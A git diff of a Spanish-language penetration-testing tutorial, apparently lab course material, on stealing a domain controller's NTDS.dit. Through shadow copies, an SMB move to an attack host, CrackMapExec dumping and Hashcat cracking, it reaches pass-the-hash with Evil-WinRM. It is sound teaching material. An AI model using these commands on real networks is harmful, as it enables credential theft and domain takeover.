@@ -169,6 +169,8 @@ En este ejemplo, CrackMapExec está utilizando SMB para intentar iniciar sesión
 
 Puede ser útil saber qué podría haberse dejado atrás después de un ataque. Conocer esto puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que estamos trabajando. En cualquier sistema operativo Windows, un administrador puede navegar al Visor de eventos y ver los eventos de seguridad para ver las acciones exactas que se registraron. Esto puede informar decisiones para implementar controles de seguridad más estrictos y ayudar en cualquier posible investigación que pueda estar involucrada después de una violación.
 
+<figure><img src="../../.gitbook/assets/events_dc.webp" alt=""><figcaption></figcaption></figure>
+
 Una vez que hayamos descubierto algunas credenciales, podríamos proceder a intentar obtener acceso remoto al controlador de dominio objetivo y capturar el archivo `NTDS.dit`.
 
 ## Capturando NTDS.dit
@@ -292,12 +294,12 @@ Copia de sombra creada con éxito para 'C:\'
 Luego podemos copiar el archivo `NTDS.dit` desde la copia de sombra del volumen C: a otra ubicación en el disco para prepararlo para mover `NTDS.dit` a nuestro host de ataque.
 
 ```bash
-bashCopiar código  Atacando Active Directory & NTDS.dit
+Atacando Active Directory & NTDS.dit
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
 ```scss
-scssCopiar código        1 file(s) copied.
+       1 file(s) copied.
 ```
 
 Antes de copiar `NTDS.dit` a nuestro host de ataque, es posible que queramos usar la técnica que aprendimos anteriormente para crear un recurso compartido de SMB en nuestro host de ataque. No dudes en volver a la sección **Atacando SAM** para revisar ese método si es necesario.
@@ -415,7 +417,7 @@ Podemos usar **vssadmin** para crear una copia de volumen sombra (VSS) del disco
 #### Atacando Active Directory & NTDS.dit
 
 ```bash
-bashCopiar código*Evil-Win-RM* PS C:\> vssadmin CREATE SHADOW /For=C:
+*Evil-Win-RM* PS C:\> vssadmin CREATE SHADOW /For=C:
 ```
 
 **Salida de VSS**
@@ -433,46 +435,38 @@ Successfully created shadow copy for 'C:\'
 
 Podemos luego copiar el archivo **NTDS.dit** desde la copia de sombra del volumen **C:** a otra ubicación en el disco para prepararnos para mover **NTDS.dit** a nuestro host de ataque.
 
-#### Atacando Active Directory & NTDS.dit
-
 ```bash
-bashCopiar código*Evil-Win-RM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+*Evil-Win-RM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
 ```plaintext
-plaintextCopiar código        1 file(s) copied.
+        1 file(s) copied.
 ```
 
 Antes de copiar **NTDS.dit** a nuestro host de ataque, podríamos querer usar la técnica que aprendimos anteriormente para crear un recurso compartido SMB en nuestro host de ataque. Siéntete libre de volver a la sección **Atacando SAM** para revisar ese método si es necesario.
 
-***
-
-## Transfiriendo NTDS.dit al Host de Ataque
+### Transfiriendo NTDS.dit al Host de Ataque
 
 Ahora se puede usar `cmd.exe /c move` para mover el archivo desde el DC objetivo a la carpeta compartida en nuestro host de ataque.
 
-#### Atacando Active Directory & NTDS.dit
-
 ```bash
-bashCopiar código*Evil-Win-RM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
+*Evil-Win-RM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
 ```
 
 ```plaintext
-plaintextCopiar código        1 file(s) moved.
+       1 file(s) moved.
 ```
 
 ### Un Método Más Rápido: Usando cme para Capturar NTDS.dit
 
 Alternativamente, podemos beneficiarnos de usar **CrackMapExec** para llevar a cabo los mismos pasos mostrados anteriormente, todo con un solo comando. Este comando nos permite utilizar VSS para capturar y volcar rápidamente el contenido del archivo **NTDS.dit** convenientemente dentro de nuestra sesión de terminal.
 
-#### Atacando Active Directory & NTDS.dit
-
 ```bash
-bashCopiar códigosherlock28@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+sherlock28@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
 
 ```plaintext
-plaintextCopiar códigoSMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
+SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
 SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
 SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
 SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
@@ -508,38 +502,36 @@ SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-h
 ```
 
 ```plaintext
-plaintextCopiar código[*] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
+[*] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
 ```
 
-### Cracking Hashes y Obteniendo Credenciales
+## Cracking Hashes y Obteniendo Credenciales
 
 Podemos proceder creando un archivo de texto que contenga todos los hashes de NT, o podemos copiar y pegar individualmente un hash específico en una sesión de terminal y usar **Hashcat** para intentar romper el hash y obtener una contraseña en texto claro.
 
-#### Rompiendo un Hash Único con Hashcat
+### Rompiendo un Hash Único con Hashcat
 
 ```bash
-bashCopiar código### Atacando Active Directory & NTDS.dit
+### Atacando Active Directory & NTDS.dit
 sherlock28@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
 
 ```plaintext
-plaintextCopiar código64f12cddaa88057e06a81b54e73b949b:Password1
+64f12cddaa88057e06a81b54e73b949b:Password1
 ```
 
 En muchas de las técnicas que hemos cubierto hasta ahora, hemos tenido éxito al romper hashes que hemos obtenido.
 
 #### ¿Qué pasa si no tenemos éxito en romper un hash?
 
-### Consideraciones de Pass-the-Hash
+## Consideraciones de Pass-the-Hash
 
-Aún podemos usar hashes para intentar autenticar a un sistema utilizando un tipo de ataque llamado **Pass-the-Hash (PtH)**. Un ataque PtH aprovecha el protocolo de autenticación **NTLM** para autenticar a un usuario usando un hash de contraseña. En lugar de usar el formato **nombre de usuario**
+Aún podemos usar hashes para intentar autenticar a un sistema utilizando un tipo de ataque llamado **Pass-the-Hash (PtH)**. Un ataque PtH aprovecha el protocolo de autenticación **NTLM** para autenticar a un usuario usando un hash de contraseña. En lugar de usar el formato **nombre de usuario en texto claro** para el inicio de sesión, podemos usar **nombre de usuario de contraseña**. Aquí hay un ejemplo de cómo funcionaría esto:
 
-**ña en texto claro** para el inicio de sesión, podemos usar **nombre de usuariode contraseña**. Aquí hay un ejemplo de cómo funcionaría esto:
-
-#### Pass-the-Hash con Evil-WinRM Ejemplo
+### Pass-the-Hash con Evil-WinRM Ejemplo
 
 ```bash
-bashCopiar código### Atacando Active Directory & NTDS.dit
+### Atacando Active Directory & NTDS.dit
 sherlock28@htb[/htb]$ evil-winrm -i 10.129.201.57  -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
 ```
 
